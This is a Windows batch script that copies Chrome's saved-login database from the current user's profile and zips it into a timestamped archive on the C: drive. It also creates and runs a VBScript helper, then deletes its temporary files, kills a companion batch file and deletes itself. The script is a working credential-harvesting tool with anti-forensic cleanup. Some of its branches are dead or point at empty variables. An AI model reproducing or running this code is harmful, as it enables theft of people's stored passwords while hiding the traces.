@echo off
set drive=C
set set=n
if '%set%'=='y' goto :sec
set out=n
if '%out%'=='y' goto :top1
set TEMPDIR=C:\temp738
rmdir %TEMPDIR%
mkdir %TEMPDIR%
set FILETOZIP=C:\temp738\Login Data
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" %TEMPDIR%
CLS
color a
echo Set objArgs = WScript.Arguments > _zipIt.vbs
echo InputFolder = objArgs(0) >> _zipIt.vbs
echo ZipFile = objArgs(1) >> _zipIt.vbs
echo CreateObject("Scripting.FileSystemObject").CreateTextFile(ZipFile, True).Write "PK" ^& Chr(5) ^& Chr(6) ^& String(18, vbNullChar) >> _zipIt.vbs
echo Set objShell = CreateObject("Shell.Application") >> _zipIt.vbs
echo Set source = objShell.NameSpace(InputFolder).Items >> _zipIt.vbs
echo objShell.NameSpace(ZipFile).CopyHere(source) >> _zipIt.vbs
echo wScript.Sleep 5000 >> _zipIt.vbs

CScript  _zipIt.vbs  %TEMPDIR% C:\data.zip
@RD /S /Q "C:\temp738"
for /f "delims=" %%a in ('wmic OS Get localdatetime  ^| find "."') do set dt=%%a
set YYYY=%dt:~0,4%
set MM=%dt:~4,2%
set DD=%dt:~6,2%
set HH=%dt:~8,2%
set Min=%dt:~10,2%
set Sec=%dt:~12,2%
SLEEP 1
set stamp=%YYYY%-%MM%-%DD%_%HH%-%Min%-%Sec%
SET NETWORKSOURCE=C:
REN %NETWORKSOURCE%\data.zip "%stamp%.zip"
SLEEP 1
SET someOtherProgram=baslat.bat
DEL "%FILETOZIP%"
TASKKILL /IM "%someOtherProgram%"
DEL "%~f0"
exit
:top1
set output=
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" %output%
exit
:sec
set out=n
if '%out%'=='y' goto :sec1
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" C:\Users\%username%\
xcopy "Login Data2" C:\Users\%username%\
set output=
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" %output%
xcopy "Login Data2" %output%

